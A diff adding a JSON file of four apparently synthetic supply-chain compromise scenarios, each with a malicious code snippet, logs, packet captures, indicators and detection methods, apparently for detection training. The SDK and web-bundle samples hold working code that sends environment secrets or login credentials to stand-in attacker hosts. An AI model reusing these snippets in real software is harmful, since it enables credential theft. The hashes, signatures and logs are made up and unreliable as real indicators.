@@ -1,0 +1,198 @@
+{
+  "samples": [
+    {
+      "scenario": "Compromise of a popular hardware vendor's firmware update package by embedding a stealthy rootkit in the firmware binary, enabling persistent remote access to affected devices in enterprise networks.",
+      "technical_data": {
+        "software_release_manifest": {
+          "version": "5.4.0",
+          "files": [
+            {
+              "path": "firmware/fw_main.bin",
+              "sha256": "d2f7a3c9b56f8a4e1e5b9c2f8a9d4c3b5d7f8e9a6c1b2d3f4e5a6b7c8d9e0f1a"
+            },
+            {
+              "path": "docs/release_notes.txt",
+              "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+          ],
+          "signature": "MEYCIQCyxN6Kak+vXo8R3oR9qE7xR7N7uXKqZ5QmZcNfTqGgI9QIhAI+hZx+zE+Gq8Vbqx9aN2NjsXr3x7X7y6hggXkF+uJvF4"
+        },
+        "malicious_code_snippet": "/* Embedded rootkit in firmware binary */\nvoid stealth_backdoor() {\n    // Hook to firmware update handler\n    if (check_trigger_condition()) {\n        open_remote_shell(\"192.168.100.200\", 4444);\n    }\n}\n// Triggered during device startup",
+        "git_commit_log": "commit 2a9f7c8d6e4b3a1f0c9d8e7b6a5f4d3c2b1a0e9f\nAuthor: Alice Smith <alice.smith@hardwarevendor.com>\nDate:   Wed May 1 09:22:55 2024 +0000\n\n    Update firmware to v5.4.0\n\n    Modified firmware/fw_main.bin\n\n    [Injected rootkit: added stealth_backdoor function]",
+        "hashes": {
+          "malicious_file": {
+            "md5": "9e107d9d372bb6826bd81d3542a419d6",
+            "sha1": "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
+            "sha256": "d2f7a3c9b56f8a4e1e5b9c2f8a9d4c3b5d7f8e9a6c1b2d3f4e5a6b7c8d9e0f1a"
+          }
+        },
+        "downstream_application_log": "[2024-05-10 08:45:12] INFO Firmware update started\n[2024-05-10 08:45:15] DEBUG Device reboot initiated\n[2024-05-10 08:45:20] WARNING Unauthorized shell session established\n[2024-05-10 08:45:25] INFO Firmware update completed",
+        "network_packet_capture_excerpt": "Frame 2156: 200 bytes on wire (1600 bits), 200 bytes captured (1600 bits)\nEthernet II, Src: 00:50:56:a8:00:01, Dst: 00:15:5d:00:04:01\nInternet Protocol Version 4, Src: 10.0.0.15, Dst: 192.168.100.200\nTransmission Control Protocol, Src Port: 55555, Dst Port: 4444, Seq: 3456, Ack: 7890\nPayload (shell commands)",
+        "process_creation_log": "2024-05-10T08:45:20.456Z device1 audit: pid=7890 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='Stealth backdoor triggered, remote shell opened'",
+        "code_signing_log": "2024-05-01T09:22:55Z signature verification failed for firmware/fw_main.bin: signature mismatch detected",
+        "vendor_risk_report_excerpt": "Vendor: SecureHardware Inc.\nLast assessment: 2024-04-20\nFlagged issues: No anomalies found prior to firmware 5.4.0 release\nRecommendation: Enhance firmware code auditing and implement hardware root-of-trust verification",
+        "indicators": [
+          "SHA256 hash d2f7a3c9b56f8a4e1e5b9c2f8a9d4c3b5d7f8e9a6c1b2d3f4e5a6b7c8d9e0f1a of fw_main.bin deviates from previous version",
+          "Unexpected TCP connection from device to suspicious IP 192.168.100.200 on port 4444",
+          "Firmware signature verification failure during update process",
+          "Kernel audit log indicating stealth backdoor activation and remote shell open",
+          "Anomalous process creation with root privileges not matching normal startup sequence"
+        ],
+        "detection_method": "Firmware integrity checks with automated signature verification; kernel audit logs monitoring for unauthorized process creation; network IDS detecting unusual outbound connections to rare IP/port combinations; vendor firmware repository monitoring for unsigned or suspicious commits.",
+        "relevant_mitre_techniques": [
+          "T1195 - Supply Chain Compromise",
+          "T1547 - Boot or Logon Autostart Execution",
+          "T1574 - Hijack Execution Flow",
+          "T1071 - Application Layer Protocol",
+          "T1553 - Subvert Trust Controls"
+        ]
+      }
+    },
+    {
+      "scenario": "Compromise of a popular cloud service provider's SDK by embedding malicious telemetry code that exfiltrates sensitive environment variables and credentials from client applications using the SDK.",
+      "technical_data": {
+        "software_release_manifest": {
+          "version": "2.7.9",
+          "files": [
+            {
+              "path": "sdk/client/telemetry.py",
+              "sha256": "a4d8c2b1e9f7d6a3c4b5e7f8a9d0c1b2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8"
+            },
+            {
+              "path": "sdk/client/auth.py",
+              "sha256": "b5f6c7d8e9f0a1b2c3d4e5f6a7b8a4d8c2b1e9f7d6a3c4b5e7f8a9d0c1b2e3f4"
+            }
+          ],
+          "signature": "MEQCIF9U7KPqK9J3Lh6+8qz3xA5qcg2Ftc1/2HKbX9VfiWFiAiB+1J5gq6h0lYH0I7NQ=="
+        },
+        "malicious_code_snippet": "import os, threading, requests\n\ndef send_telemetry():\n    env_vars = {k: os.getenv(k) for k in ['AWS_SECRET_ACCESS_KEY', 'DB_PASSWORD']}\n    try:\n        requests.post('https://evil-collector.example.com/collect', json=env_vars, timeout=2)\n    except:\n        pass\n\nthreading.Thread(target=send_telemetry, daemon=True).start()\n\n# Injected telemetry exfiltration on SDK initialization",
+        "git_commit_log": "commit 7d5e6f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e\nAuthor: DevOps Bot <devops@cloudsdk.com>\nDate:   Mon May 6 16:45:30 2024 +0000\n\n    Update telemetry module for performance improvements\n\n    Modified sdk/client/telemetry.py\n\n    [Injected telemetry exfiltration code]",
+        "hashes": {
+          "malicious_file": {
+            "md5": "45c48cce2e2d7fbdea1afc51c7c6ad26",
+            "sha1": "7c211433f02071597741e6ff5a8ea34789abbf43",
+            "sha256": "a4d8c2b1e9f7d6a3c4b5e7f8a9d0c1b2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8"
+          }
+        },
+        "downstream_application_log": "[2024-05-07 11:22:10] INFO SDK initialized\n[2024-05-07 11:22:11] DEBUG Telemetry data sent to https://evil-collector.example.com/collect\n[2024-05-07 11:22:12] INFO Operation completed successfully",
+        "network_packet_capture_excerpt": "Frame 4321: 180 bytes on wire (1440 bits), 180 bytes captured (1440 bits)\nEthernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:5e:4d:3c:2b:1a\nInternet Protocol Version 4, Src: 172.16.0.10, Dst: 198.51.100.42\nTransmission Control Protocol, Src Port: 34567, Dst Port: 443, Seq: 1010, Ack: 2020\nHypertext Transfer Protocol\n    POST /collect HTTP/1.1\r\n    Host: evil-collector.example.com\r\n    Content-Type: application/json\r\n    Content-Length: 87\r\n\r\n{\"AWS_SECRET_ACCESS_KEY\":\"AKIAIOSFODNN7EXAMPLE\",\"DB_PASSWORD\":\"supersecret\"}",
+        "process_creation_log": "2024-05-07T11:22:10.789Z app-server audit: pid=3345 uid=1001 auid=1001 ses=3 subj=unconfined msg='SDK telemetry thread started, sending environment variables'",
+        "code_signing_log": "2024-05-06T16:45:30Z signature verification failed for sdk/client/telemetry.py: commit signature invalid",
+        "vendor_risk_report_excerpt": "Vendor: CloudSDK Solutions\nLast assessment: 2024-04-28\nFlagged issues: No prior issues; sudden signature failure on telemetry.py detected 2024-05-06\nRecommendation: Implement mandatory peer code reviews and enhanced CI/CD pipeline checks including environment variable leakage detection",
+        "indicators": [
+          "SHA256 hash a4d8c2b1e9f7d6a3c4b5e7f8a9d0c1b2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8 of telemetry.py differs from last approved release",
+          "Outbound HTTPS POST request to suspicious domain evil-collector.example.com transmitting sensitive environment variables",
+          "Code signing failure for telemetry.py during automated CI/CD pipeline verification",
+          "Unusual background thread creation in SDK process sending environment secrets",
+          "Network packets containing AWS and database credentials in JSON payload"
+        ],
+        "detection_method": "CI/CD pipeline automated signature and code integrity verification; network traffic monitoring for unusual HTTPS POSTs containing sensitive data; runtime monitoring detecting unexpected thread creation and environment variable access; vendor repository audit for unreviewed or unsigned commits.",
+        "relevant_mitre_techniques": [
+          "T1195 - Supply Chain Compromise",
+          "T1537 - Transfer Data to Cloud Account",
+          "T1059 - Command and Scripting Interpreter",
+          "T1071 - Application Layer Protocol",
+          "T1552 - Unsecured Credentials"
+        ]
+      }
+    },
+    {
+      "scenario": "Malicious actor gains access to a hardware vendor's firmware build system and inserts a stealthy rootkit into the latest firmware image for network routers, enabling persistent unauthorized access for downstream customers.",
+      "technical_data": {
+        "firmware_release_manifest": {
+          "version": "5.14.0",
+          "files": [
+            {
+              "path": "firmware/net_router.bin",
+              "sha256": "a3f5c7d9b8e6f1a2c42e9d8f7b3c4a1f5d7e8c9b0a1234567890abcdef123456"
+            },
+            {
+              "path": "docs/release_notes.txt",
+              "sha256": "e4f8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a29108f7e6d5c4b3a29108f7e6d5c4"
+            }
+          ],
+          "signature": "MEYCIQDzQ6Q9vZ9h3nCq8X5UeF0b1o3T5vG7Z8J2K3L4M5N6O7P8QIgF1E2D3C4B5A6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0="
+        },
+        "malicious_code_snippet": "# Rootkit payload inserted into firmware\nvoid stealth_rootkit() {\n    // Hook network stack to intercept packets\n    hook_network_stack();\n    // Open backdoor on port 65535\n    open_backdoor(65535);\n}\n\n// Initialization called during boot\nvoid firmware_init() {\n    stealth_rootkit();\n}\n",
+        "git_commit_log": "commit e7d9c6b5a4f3e2d1c0b9a8f7e6d5c4b3a29108f7\nAuthor: Jane Smith <jane.smith@hardwarevendor.com>\nDate:   Mon May 20 09:22:17 2024 +0000\n\n    Firmware update: improve stability and security\n\n    Modified firmware/net_router.bin\n\n    [Injected stealth rootkit payload for persistent access]",
+        "hashes": {
+          "malicious_firmware": {
+            "md5": "d41d8cd98f00b204e9800998ecf8427e",
+            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "sha256": "a3f5c7d9b8e6f1a2c42e9d8f7b3c4a1f5d7e8c9b0a1234567890abcdef123456"
+          }
+        },
+        "downstream_device_log": "[2024-06-01 03:17:22] INFO Firmware boot completed\n[2024-06-01 03:17:23] DEBUG Network stack hooked\n[2024-06-01 03:17:24] WARNING Unexpected listening port 65535 detected\n[2024-06-01 03:17:25] INFO Backdoor connection established from 10.0.0.5",
+        "network_packet_capture_excerpt": "Frame 5678: 200 bytes on wire (1600 bits), 200 bytes captured (1600 bits)\nEthernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:5e:4d:3c:2b:1a\nInternet Protocol Version 4, Src: 10.0.0.5, Dst: 198.51.100.42\nTransmission Control Protocol, Src Port: 65535, Dst Port: 443, Seq: 1001, Ack: 2001\nPayload: Encrypted backdoor communication",
+        "process_creation_log": "2024-06-01T03:17:24.010Z router-host audit: pid=1023 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='network stack hook installed by unknown module'",
+        "code_signing_log": "2024-05-20T09:22:17Z signature verification failed for firmware/net_router.bin: unexpected signature mismatch, possible tampering detected",
+        "vendor_risk_report_excerpt": "Vendor: NetGear Solutions\nLast assessment: 2024-04-30\nFlagged issues: Build system access controls insufficient, no multi-factor authentication for firmware signing\nRecommendation: Enforce strong access controls, implement hardware security modules (HSM) for signing, conduct regular audits",
+        "indicators": [
+          "SHA256 hash a3f5c7d9b8e6f1a2c42e9d8f7b3c4a1f5d7e8c9b0a1234567890abcdef123456 differs from known good firmware",
+          "Firmware signature verification failure during CI/CD pipeline",
+          "Unusual network listening port 65535 detected on downstream routers",
+          "Backdoor network connections originating from internal device IP",
+          "Kernel audit logs show unauthorized network stack hooks"
+        ],
+        "detection_method": "Firmware integrity validation via hash comparison and signature verification; network traffic analysis to detect unusual open ports and encrypted backdoor communication; kernel audit subsystem monitoring for unauthorized hooks; vendor security audits revealing build system vulnerabilities.",
+        "relevant_mitre_techniques": [
+          "T1195 - Supply Chain Compromise",
+          "T1547 - Boot or Logon Autostart Execution",
+          "T1055 - Process Injection",
+          "T1574 - Hijack Execution Flow",
+          "T1071 - Application Layer Protocol",
+          "T1553 - Subvert Trust Controls"
+        ]
+      }
+    },
+    {
+      "scenario": "Attackers infiltrate a popular cloud-based SaaS provider's update mechanism, injecting malicious scripts into web client-side JavaScript libraries that exfiltrate user credentials to an attacker-controlled server.",
+      "technical_data": {
+        "software_release_manifest": {
+          "version": "12.0.4",
+          "files": [
+            {
+              "path": "client/static/js/main.bundle.js",
+              "sha256": "d2f1e3a4b5c6d7e8f9a0b1c2d3e4f56789abcdef0123456789abcdef01234567"
+            },
+            {
+              "path": "client/static/css/styles.css",
+              "sha256": "f1e2d3c4b5a6978877665544332211ffeeccbb99887766554433221100ffeeaa"
+            }
+          ],
+          "signature": "MEQCID9Cb7v6ZkU3F1I0Yl1Z5nZX2jW3Px8O9B8JkL0M1N2O3P4AiB7C8D9E0F1G2H3I4J5K6L7M8N9O0P1Q2R3S4T5U6V7W8="
+        },
+        "malicious_code_snippet": "(() => {\n  const originalFetch = window.fetch;\n  window.fetch = function() {\n    const args = arguments;\n    if (args[0].includes('/login')) {\n      args[1].body.getReader().read().then(({ value }) => {\n        const creds = new TextDecoder().decode(value);\n        fetch('https://exfil.attacker.com/creds', {\n          method: 'POST',\n          body: creds\n        });\n      });\n    }\n    return originalFetch.apply(this, args);\n  };\n})();",
+        "git_commit_log": "commit c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4\nAuthor: Alice Nguyen <alice.nguyen@saasprovider.com>\nDate:   Fri May 10 16:45:30 2024 +0000\n\n    Update: improve login flow\n\n    Modified client/static/js/main.bundle.js\n\n    [Malicious injection: added credential exfiltration script]",
+        "hashes": {
+          "malicious_js": {
+            "md5": "098f6bcd4621d373cade4e832627b4f6",
+            "sha1": "ad0234829205b9033196ba818f7a872b",
+            "sha256": "d2f1e3a4b5c6d7e8f9a0b1c2d3e4f56789abcdef0123456789abcdef01234567"
+          }
+        },
+        "downstream_application_log": "[2024-05-12 08:55:33] INFO User login initiated\n[2024-05-12 08:55:33] DEBUG Intercepted fetch request to /login\n[2024-05-12 08:55:34] WARNING Unexpected outbound POST to https://exfil.attacker.com/creds\n[2024-05-12 08:55:35] INFO Login successful",
+        "network_packet_capture_excerpt": "Frame 8910: 180 bytes on wire (1440 bits), 180 bytes captured (1440 bits)\nEthernet II, Src: 00:1b:44:11:3a:b7, Dst: 00:1d:7e:2a:3c:d8\nInternet Protocol Version 4, Src: 192.168.100.23, Dst: 203.0.113.42\nTransmission Control Protocol, Src Port: 52345, Dst Port: 443, Seq: 7890, Ack: 4567\nHypertext Transfer Protocol\n    POST /creds HTTP/1.1\r\n    Host: exfil.attacker.com\r\n    Content-Length: 123\r\n    Content-Type: text/plain\r\n\r\n    [Captured user credentials payload]",
+        "process_creation_log": "2024-05-12T08:55:33.456Z web-client audit: pid=8765 uid=1000 auid=1000 ses=5 subj=unconfined msg='Injected script intercepted login fetch call'",
+        "code_signing_log": "2024-05-10T16:45:30Z signature verification failed for client/static/js/main.bundle.js: signature mismatch, commit not verified",
+        "vendor_risk_report_excerpt": "Vendor: CloudSaaS Inc.\nLast assessment: 2024-04-28\nFlagged issues: Insufficient code signing enforcement, lax review on client-side code updates\nRecommendation: Enforce strict code signing, implement automated static analysis and runtime monitoring for client scripts",
+        "indicators": [
+          "SHA256 hash d2f1e3a4b5c6d7e8f9a0b1c2d3e4f56789abcdef0123456789abcdef01234567 of main.bundle.js changed unexpectedly",
+          "Outbound HTTPS POST requests to suspicious domain exfil.attacker.com from client browsers",
+          "Signature verification failure on client static JavaScript bundle in release 12.0.4",
+          "Browser logs show overridden fetch function sending credentials to external server",
+          "Network captures reveal credential payload exfiltration via HTTPS POST"
+        ],
+        "detection_method": "Continuous monitoring of release artifact hashes and signature verification; browser instrumentation detecting script overrides and unusual network requests; network IDS alerts on outbound connections to known malicious domains; vendor security reviews highlighting code signing gaps.",
+        "relevant_mitre_techniques": [
+          "T1195 - Supply Chain Compromise",
+          "T1059 - Command and Scripting Interpreter",
+          "T1071 - Application Layer Protocol",
+          "T1110 - Brute Force (for credential harvesting attempts)",
+          "T1553 - Subvert Trust Controls",
+          "T1539 - Steal Web Session Cookie"
+        ]
+      }
+    }
+  ]
+}
